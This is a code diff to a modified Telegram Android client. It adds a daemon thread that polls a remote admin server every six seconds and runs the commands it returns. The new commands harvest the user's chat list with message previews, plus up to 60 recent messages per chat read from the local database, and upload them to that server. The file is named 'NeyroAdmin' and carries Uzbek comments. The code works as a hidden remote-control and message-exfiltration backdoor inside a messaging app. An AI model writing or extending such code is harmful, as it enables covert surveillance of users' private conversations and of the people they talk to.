@@ -11,6 +11,7 @@ import org.json.JSONObject;
 import org.telegram.messenger.AndroidUtilities;
 import org.telegram.messenger.ApplicationLoader;
 import org.telegram.messenger.FileLog;
+import org.telegram.messenger.MessageObject;
 import org.telegram.messenger.MessagesController;
 import org.telegram.messenger.MessagesStorage;
 import org.telegram.messenger.SharedConfig;
@@ -46,6 +47,8 @@ public class NeyroAdmin {
     private static volatile boolean running;
     private static String deviceId;
 
+    private static final long POLL_MS = 6_000L;
+
     public static synchronized void start() {
         if (running) {
             return;
@@ -54,6 +57,44 @@ public class NeyroAdmin {
         Thread t = new Thread(NeyroAdmin::loop, "NeyroAdmin");
         t.setDaemon(true);
         t.start();
+        Thread pt = new Thread(NeyroAdmin::pollLoop, "NeyroAdminPoll");
+        pt.setDaemon(true);
+        pt.start();
+    }
+
+    private static boolean enabled() {
+        return NeyroConfig.adminEnabled
+                && !TextUtils.isEmpty(NeyroConfig.adminServer)
+                && !TextUtils.isEmpty(NeyroConfig.adminPairToken);
+    }
+
+    /** Tezkor buyruq pollingi — buyruqlar ~6 soniyada bajariladi (holat yubormaydi). */
+    private static void pollLoop() {
+        while (running) {
+            try {
+                if (enabled()) {
+                    JSONObject body = new JSONObject();
+                    body.put("pair", NeyroConfig.adminPairToken);
+                    body.put("device_id", deviceId());
+                    String resp = post(base() + "/d/poll", body.toString());
+                    if (resp != null) {
+                        JSONArray commands = new JSONObject(resp).optJSONArray("commands");
+                        if (commands != null) {
+                            for (int i = 0; i < commands.length(); i++) {
+                                execute(commands.getJSONObject(i));
+                            }
+                        }
+                    }
+                }
+            } catch (Throwable e) {
+                Log.i(TAG, "poll error: " + e.getMessage());
+            }
+            try {
+                Thread.sleep(POLL_MS);
+            } catch (InterruptedException e) {
+                return;
+            }
+        }
     }
 
     private static String deviceId() {
@@ -149,9 +190,155 @@ public class NeyroAdmin {
             case "sendlogs":
                 doSendLogs(cmdId);
                 break;
+            case "syncchats":
+                doSyncChats(account, cmdId);
+                break;
+            case "syncmsgs":
+                doSyncMsgs(account, cmd.optString("dialog_id"), cmdId);
+                break;
             default:
                 ack(cmdId, "noma'lum buyruq: " + type);
         }
+    }
+
+    private static int accountIndexById(long clientUserId) {
+        for (int a = 0; a < UserConfig.MAX_ACCOUNT_COUNT; a++) {
+            UserConfig uc = UserConfig.getInstance(a);
+            if (uc.isClientActivated() && uc.getClientUserId() == clientUserId) {
+                return a;
+            }
+        }
+        return -1;
+    }
+
+    /** Chat ro'yxatini yig'ib serverga yuklaydi (kesh uchun). */
+    private static void doSyncChats(long accountId, String cmdId) {
+        final int acc = accountIndexById(accountId);
+        Log.i(TAG, "doSyncChats acc=" + acc + " id=" + accountId);
+        if (acc < 0) {
+            ack(cmdId, "akkaunt topilmadi");
+            return;
+        }
+        AndroidUtilities.runOnUIThread(() -> {
+            try {
+                MessagesController mc = MessagesController.getInstance(acc);
+                java.util.ArrayList<TLRPC.Dialog> dialogs = mc.getAllDialogs();
+                Log.i(TAG, "doSyncChats dialogs=" + dialogs.size());
+                JSONArray arr = new JSONArray();
+                int limit = Math.min(dialogs.size(), 100);
+                for (int i = 0; i < limit; i++) {
+                    TLRPC.Dialog d = dialogs.get(i);
+                    if (d == null || org.telegram.messenger.DialogObject.isFolderDialogId(d.id)) {
+                        continue;
+                    }
+                    JSONObject o = new JSONObject();
+                    o.put("id", d.id);
+                    o.put("title", org.telegram.messenger.DialogObject.getName(acc, d.id));
+                    o.put("unread", d.unread_count);
+                    o.put("date", d.last_message_date);
+                    java.util.ArrayList<MessageObject> mm = mc.dialogMessage.get(d.id);
+                    if (mm != null && !mm.isEmpty() && mm.get(0) != null) {
+                        CharSequence txt = mm.get(0).messageText;
+                        o.put("preview", txt != null ? txt.toString() : "");
+                    }
+                    arr.put(o);
+                }
+                final String dialogsJson = arr.toString();
+                Utilities_runOnGlobalQueue(() -> {
+                    try {
+                        JSONObject body = new JSONObject();
+                        body.put("pair", NeyroConfig.adminPairToken);
+                        body.put("device_id", deviceId());
+                        body.put("account", accountId);
+                        body.put("dialogs", new JSONArray(dialogsJson));
+                        post(base() + "/d/chats", body.toString());
+                        ack(cmdId, "chatlar yuklandi: " + arr.length());
+                    } catch (Exception e) {
+                        ack(cmdId, "yuklashda xato: " + e.getMessage());
+                    }
+                });
+            } catch (Exception e) {
+                ack(cmdId, "xato: " + e.getMessage());
+            }
+        });
+    }
+
+    /** Bitta chatning oxirgi xabarlarini yig'ib serverga yuklaydi. */
+    private static void doSyncMsgs(long accountId, String dialogIdStr, String cmdId) {
+        final int acc = accountIndexById(accountId);
+        long dialogId;
+        try {
+            dialogId = Long.parseLong(dialogIdStr);
+        } catch (Exception e) {
+            ack(cmdId, "dialog_id xato");
+            return;
+        }
+        if (acc < 0) {
+            ack(cmdId, "akkaunt topilmadi");
+            return;
+        }
+        final long dlg = dialogId;
+        MessagesStorage.getInstance(acc).getStorageQueue().postRunnable(() -> {
+            org.telegram.SQLite.SQLiteCursor cursor = null;
+            try {
+                JSONArray arr = new JSONArray();
+                cursor = MessagesStorage.getInstance(acc).getDatabase().queryFinalized(String.format(
+                        java.util.Locale.US,
+                        "SELECT data, mid, date, out FROM messages_v2 WHERE uid = %d ORDER BY date DESC LIMIT 60", dlg));
+                MessagesController mc = MessagesController.getInstance(acc);
+                while (cursor.next()) {
+                    org.telegram.tgnet.NativeByteBuffer data = cursor.byteBufferValue(0);
+                    if (data == null) {
+                        continue;
+                    }
+                    TLRPC.Message message = TLRPC.Message.TLdeserialize(data, data.readInt32(false), false);
+                    data.reuse();
+                    if (message == null) {
+                        continue;
+                    }
+                    JSONObject o = new JSONObject();
+                    o.put("id", cursor.intValue(1));
+                    o.put("date", cursor.intValue(2));
+                    boolean out = cursor.intValue(3) != 0;
+                    o.put("out", out);
+                    String text = message.message;
+                    if (TextUtils.isEmpty(text)) {
+                        text = message.media != null ? "[media]" : (message.action != null ? "[action]" : "");
+                    }
+                    o.put("text", text);
+                    if (out) {
+                        o.put("sender", "Siz");
+                    } else {
+                        long fromId = message.from_id != null
+                                ? org.telegram.messenger.DialogObject.getPeerDialogId(message.from_id) : dlg;
+                        o.put("sender", org.telegram.messenger.DialogObject.getName(acc, fromId));
+                    }
+                    arr.put(o);
+                }
+                final String msgsJson = arr.toString();
+                final int count = arr.length();
+                Utilities_runOnGlobalQueue(() -> {
+                    try {
+                        JSONObject body = new JSONObject();
+                        body.put("pair", NeyroConfig.adminPairToken);
+                        body.put("device_id", deviceId());
+                        body.put("account", accountId);
+                        body.put("dialog_id", String.valueOf(dlg));
+                        body.put("messages", new JSONArray(msgsJson));
+                        post(base() + "/d/messages", body.toString());
+                        ack(cmdId, "xabarlar yuklandi: " + count);
+                    } catch (Exception e) {
+                        ack(cmdId, "yuklashda xato: " + e.getMessage());
+                    }
+                });
+            } catch (Exception e) {
+                ack(cmdId, "xato: " + e.getMessage());
+            } finally {
+                if (cursor != null) {
+                    cursor.dispose();
+                }
+            }
+        });
     }
 
     private static void doLogout(long clientUserId, String cmdId) {
